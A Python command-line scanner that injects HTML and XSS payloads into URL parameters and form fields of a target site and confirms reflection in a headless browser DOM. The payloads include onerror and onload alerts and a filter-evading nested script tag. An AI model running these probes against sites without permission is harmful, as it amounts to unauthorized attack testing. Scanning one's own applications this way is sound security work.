import requests, argparse, json, os, time
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from colorama import Fore, Style

# === Payloads ===
payloads = [
    "<h1>injected123</h1>",
    "<div id='injected'>TEST</div>",
    "<img src=x onerror=alert('xss')>",
    "<svg/onload=alert(1)>",
    "<scr<script>ipt>alert(1)</script>",
]
custom_payloads = []
vulnerabilities = []

# === URL Param Helpers ===
def extract_params(url):
    parsed = urlparse(url)
    return list(parse_qs(parsed.query).keys())

def build_url_with_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

# === DOM Reflection Check ===
def check_in_dom(url, payload):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    driver = webdriver.Chrome(options=options)
    try:
        driver.get(url)
        time.sleep(1)
        if payload in driver.page_source:
            print(Fore.RED + f"[DOM] Payload found in DOM at {url}" + Style.RESET_ALL)
            return True
    except Exception as e:
        print(Fore.YELLOW + f"[!] DOM check error: {e}" + Style.RESET_ALL)
    finally:
        driver.quit()
    return False

# === Test GET Requests ===
def test_get(url, param, payload):
    injected_url = build_url_with_payload(url, param, payload)
    try:
        res = requests.get(injected_url, timeout=5)
        if payload in res.text:
            if check_in_dom(injected_url, payload):
                vulnerabilities.append({
                    "url": injected_url, "payload": payload, "method": "GET"
                })
    except Exception as e:
        print(Fore.YELLOW + f"[!] GET request error: {e}" + Style.RESET_ALL)

# === Test POST Requests via Forms ===
def test_post(url, form_data, payload):
    try:
        injected_data = {k: payload for k in form_data.keys()}
        res = requests.post(url, data=injected_data, timeout=5)
        if payload in res.text:
            if check_in_dom(url, payload):
                vulnerabilities.append({
                    "url": url, "payload": payload, "method": "POST", "data": injected_data
                })
    except Exception as e:
        print(Fore.YELLOW + f"[!] POST request error: {e}" + Style.RESET_ALL)

# === Auto Form Discovery ===
def find_forms(url):
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.text, "lxml")
        forms = soup.find_all("form")
        form_details = []
        for form in forms:
            inputs = form.find_all("input")
            data = {}
            for input_tag in inputs:
                name = input_tag.get("name")
                if name:
                    data[name] = "test"
            form_details.append(data)
        return form_details
    except Exception as e:
        print(Fore.YELLOW + f"[!] Error fetching forms: {e}" + Style.RESET_ALL)
        return []

# === Scan Controller ===
def scan_url(url):
    print(Fore.CYAN + f"[+] Scanning: {url}" + Style.RESET_ALL)
    all_payloads = payloads + custom_payloads
    # Test GET
    for param in extract_params(url):
        for p in all_payloads:
            test_get(url, param, p)

    # Test POST (forms)
    for form in find_forms(url):
        for p in all_payloads:
            test_post(url, form, p)

# === Save Final Report ===
def save_report():
    if vulnerabilities:
        with open("htmli_report.json", "w") as f:
            json.dump(vulnerabilities, f, indent=4)
        print(Fore.GREEN + f"[+] Report saved to htmli_report.json" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "[+] No vulnerabilities found." + Style.RESET_ALL)

# === Main CLI ===
def main():
    parser = argparse.ArgumentParser(description="Advanced HTML Injection Scanner (GET + POST + DOM)")
    parser.add_argument("url", help="Target URL (with params or forms)")
    parser.add_argument("--payloads", help="Path to custom payloads.txt", default=None)
    args = parser.parse_args()

    if args.payloads and os.path.exists(args.payloads):
        with open(args.payloads) as f:
            custom_payloads.extend([line.strip() for line in f if line.strip()])

    scan_url(args.url)
    save_report()

if __name__ == "__main__":
    main()
